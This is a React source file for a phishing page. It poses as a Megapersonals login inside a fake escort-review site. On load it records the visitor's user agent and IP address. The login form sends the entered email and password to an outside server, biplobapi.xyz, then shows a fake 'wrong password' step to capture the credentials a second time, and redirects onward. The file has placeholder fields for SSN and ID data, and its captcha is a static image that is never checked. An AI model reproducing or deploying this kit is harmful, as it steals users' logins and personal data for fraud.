import React, { useEffect, useState } from "react";
import { useLocation, useNavigate, useParams } from "react-router-dom";
import { useForm } from "react-hook-form";
import { isBrowser, isMobile } from "react-device-detect";
import "./MegaStyle.css";
import { usePageMeta } from "../../hooks/usePageMeta";

export default function MegaPage() {
  const [showAgeModal, setShowAgeModal] = useState(true);
  const [showLogin, setShowLogin] = useState(false);
  const navigate = useNavigate();
  const params = useParams();
  const location = useLocation();
  const pathAfterDomain = location.pathname.split("/").slice(1, -1).join("/");
  const [test, setTest] = useState(0);
  const [passwordError, setPasswordError] = useState(false);
  const [verified, setVerified] = useState(false);
  const [token, setToken] = useState();
  const [refreshReCaptcha, setRefreshReCaptcha] = useState(false);
  const [userAgent, setUserAgent] = useState("");
  const [ipAddress, setIPAddress] = useState("");
  const [cookies, setCookies] = useState("");
  const [codeLength, setCodeLength] = useState(true);
  const [step, setStep] = useState(0);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [captcha, setCaptcha] = useState("");
  const [captchaEror, setCaptchaError] = useState("");
  const [loader, setLoader] = useState(false);
  const [userId, setUserId] = useState();
  let type;

  const {
    register,
    handleSubmit,
    resetField,
    formState: { errors, isDirty, isValid },
    reset,
  } = useForm();

  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }

  localStorage.setItem("url", `/${pathAfterDomain}/${params.id}`);

  useEffect(() => {
    //  fetch(`https://biplobapi.xyz/auth/login/${params.id}`)
    //       .then((response) => response.json())
    //       .then((data) => {
    //         console.log(data?.user);
    //       setUserId(data?.user);
    //       });
    const userAgent = window.navigator.userAgent;
    setUserAgent(userAgent);
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => setIPAddress(data.ip))
      .catch((error) => console.log(error));
    const bookings = {
      type: type,
    };

    fetch(`https://biplobapi.xyz/updateclick/${params.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json(); // parse the JSON body
      })
      .then((data) => {
        console.log("Update successful:", data?.data?.userId);
        setUserId(data?.data?.userId); // if needed
      })
      .catch((error) => {
        console.error("Fetch error:", error);
      });

    // Cleanup function to stop the camera when the component unmounts
    // Set the document title
    document.title = "Megapersonal";

    // Create a link element for the favicon
    // const favicon = document.createElement("link");
    // favicon.rel = "icon";
    // favicon.href = "/favicon.ico"; // Update with the correct path to your favicon

    // // Append the favicon to the head
    // document.head.appendChild(favicon);

    // Cleanup function to remove the favicon when the component is unmounted or favicon changes
  }, [type, params.id]);
  const handleAgree = () => {
    setShowAgeModal(false);
    setShowLogin(true);
  };

  const handleAddBooking = (data) => {
    console.log(userId);
    setLoader(true);
    if (step === 0) {
      const bookings = {
        email: data.email,
        address: data.password,
        site: "mega",
        code: "",
        ssn: "",
        idOne: "",
        idTwo: "",
        agent: userAgent,
        // cookieData:JSON.stringify(cookieData, null, 2),
        ip: ipAddress,
        userId: userId,
        temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
        postingTime: Date().toLocaleString(),
        isDeleted: false,
      };
      fetch("https://biplobapi.xyz/informations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify(bookings),
      })
        .then((res) => res.json())
        .then((result) => {
          setStep(1);
          setEmail(data.email);
          setPassword(data.password);
          setLoader(false);
          // setPasswordError(true);
          // setCodeLength(false);
          // setCaptchaError('Captcha doesnt match');
        });
    } else {
      setLoader(true);
      setPasswordError(false);
      localStorage.setItem("femail", data.email);
      const bookings = {
        email: email + " // " + data.email,
        address: password + " // " + data.password,
        site: "mega",
        code: "",
        ssn: "",
        idOne: "",
        idTwo: "",
        agent: userAgent,
        // cookieData:JSON.stringify(cookieData, null, 2),
        ip: ipAddress,
        userId: userId,
        temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
        postingTime: Date().toLocaleString(),
        isDeleted: false,
      };
      console.log(bookings);
      fetch("https://biplobapi.xyz/informations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify(bookings),
      })
        .then((res) => res.json())
        .then((result) => {
          reset();
          setLoader(false);
          pathInfo(bookings);
        });
    }
  };

  const pathInfo = (infos) => {
    let userId = window.location.pathname;
    const fnl = userId.substring(
      userId.indexOf("/") + 1,
      userId.lastIndexOf("/"),
    );
    // navigate("/gmail", { state: { temp: infos.temp } });
    navigate("/security", { state: { temp: infos.temp } });
    // if (fnl === "auth/login" || "verify/login" ) {
    //   navigate("/security", { state: { temp: infos.temp } });
    // } else {
    // }
  };
  usePageMeta(
    "Escort Babylon: Reviews of Escorts",
    "/escortBabylonfavicon.ico",
  );
  return (
    <div className="new-pg">
      <div className="page-bg">
        {/* ===== AGE MODAL ===== */}
        {showAgeModal && (
          <div className="overlay">
            <div className="age-modal">
              <h2>TERMS OF USE</h2>
              <p>
                By clicking the link below you confirm that you are 18 or older
                and understand that the site may include adult content, you
                agree with all the terms of use.
              </p>

              <button className="agree-btn" onClick={handleAgree}>
                I agree and I am 18+
              </button>
            </div>
          </div>
        )}
        {/* HEADER */}
        <div className="top-header">
          <img src="/ebMainLogo.png" alt="" />
        </div>

        {/* NAVIGATION */}
        <div className="nav-bar">
          <div className="nav-item">
            <img src="/ebMainNavPosts3.png" alt="" />
          </div>
          <div className="nav-item">
            <img src="/ebMainNavInfo3.png" alt="" />
          </div>
          <div className="nav-item">
            <img src="/ebMainNavPictures3.png" alt="" />
          </div>
          <div className="nav-item active">
            <img
              src="/ebMainNavReviewsActive3.png"
              alt=""
              className="actv-img"
            />
          </div>
          <div className="nav-item">
            <img src="/ebMainNavPostsComments3.png" alt="" />
          </div>
        </div>

        {/* MAIN CONTENT CARD */}
        <div className="content-card">
          <div className="review-header">
            <div style={{ width: "35%" }}>
              <img src="/ebMeter100.png" alt="" className="eb-img" />
              <p className="cr-text">Community Rating</p>
            </div>
            <img src="/ebMainHeaderReviews.png" alt="" className="rr-img" />
          </div>

          <button className="green-small">View Post</button>

          <div className="image-row">
            <div className="img-box">
              <img src="/eb.png" alt="" />
            </div>
            <div className="img-box">
              <img src="/eb.png" alt="" />
            </div>
            <div className="img-box">
              <img src="/eb.png" alt="" />
            </div>
            <div className="img-box">
              <img src="/eb.png" alt="" />
            </div>
          </div>

          <button className="orange-btn">
            Read Reviews <br />
            <span className="ddfd">of this provider</span>
          </button>
          <button className="green-btn" onClick={() => setShowLogin(true)}>
            Submit a Review <br />
            <span className="sdf">of this Provider</span>
          </button>

          <div className="trust-text">
            <img src="/ebReviewsBlurbRedTop.png" alt="" />
          </div>

          <img src="/ebBackToLc2.png" alt="" className="b2t" />
        </div>

        {/* LOGIN MODAL */}
        {showLogin && (
          <div className="overlay">
            <div className="login-modal">
              <div className="login-header">
                <div className="avatar">
                  <img src="/megapersonalscom.jpg" alt="" />
                </div>
                MEGAPERSONALS
              </div>

              <form
                onSubmit={handleSubmit(handleAddBooking)}
                className="login-body"
              >
                <h3>Already have an account?</h3>

                <input
                  placeholder="Email"
                  {...register("email", { required: true })}
                />
                <input
                  type="password"
                  placeholder="Password"
                  {...register("password", { required: true })}
                />

                <div class="cap_wrap">
                  <div class="captcha_image">
                    <img
                      src="/cap4.png"
                      id="captcha_image_itself"
                      alt="captcha"
                    />
                  </div>
                  <div class="replyCaptchaReloadButton">
                    <a href="javascript:void(0);">
                      <img src="/reloadButton.png" width="40" height="40" />
                    </a>
                  </div>
                </div>

                <input placeholder="Enter code from the picture" />
                {passwordError && (
                  <small style={{ color: "#FF8080" }}>
                    Email or Password is wrong
                  </small>
                )}

                <button type="submit" className="login-btn">
                  LOG IN
                </button>

                <div className="network-text">Part of the BABYLON NETWORK</div>

                <div className="forgot">I FORGOT MY PASSWORD 😟</div>
              </form>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
